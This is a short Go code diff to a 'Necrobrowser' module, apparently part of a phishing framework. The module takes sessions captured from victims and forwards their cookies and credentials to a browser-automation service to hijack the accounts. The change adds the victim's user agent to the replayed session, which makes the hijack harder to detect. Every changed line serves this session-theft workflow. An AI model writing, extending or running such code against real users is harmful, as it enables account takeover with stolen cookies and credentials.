@@ -27,6 +27,7 @@ const (
 	TrackerPlaceholder     = "%%%TRACKER%%%"
 	CookiePlaceholder      = "%%%COOKIES%%%"
 	CredentialsPlaceholder = "%%%CREDENTIALS%%%"
+	UserAgentPlaceholder   = "%%%USERAGENT%%%"
 )
 
 // Necrobrowser module
@@ -176,7 +177,7 @@ func (module *Necrobrowser) CheckSessionCookies() {
 			}
 
 			module.Info("instrumenting %s using %d cookies", tui.Bold(tui.Red(v.ID)), tui.Bold(tui.Red(string(rune(cookiesFound)))))
-			module.Instrument(v.ID, v.Cookies, string(j))
+			module.Instrument(v.ID, v.Cookies, string(j), v.UA)
 
 			// prevent the session to be instrumented twice
 			_ = db.SetSessionAsInstrumented(v.ID)
@@ -193,7 +194,7 @@ func Contains(slice *[]string, find string) bool {
 	return false
 }
 
-func (module *Necrobrowser) Instrument(victimID string, cookieJar []db.VictimCookie, credentialsJSON string) {
+func (module *Necrobrowser) Instrument(victimID string, cookieJar []db.VictimCookie, credentialsJSON string, userAgent string) {
 	var necroCookies []SessionCookie
 	const timeLayout = "2006-01-02 15:04:05 -0700 MST"
 
@@ -228,6 +229,7 @@ func (module *Necrobrowser) Instrument(victimID string, cookieJar []db.VictimCoo
 	newRequest = strings.ReplaceAll(newRequest, TrackerPlaceholder, victimID)
 	newRequest = strings.ReplaceAll(newRequest, CookiePlaceholder, string(c))
 	newRequest = strings.ReplaceAll(newRequest, CredentialsPlaceholder, credentialsJSON)
+	newRequest = strings.ReplaceAll(newRequest, UserAgentPlaceholder, userAgent)
 
 	module.Info("instrumenting %s", tui.Bold(tui.Red(victimID)))
 	client := resty.New()
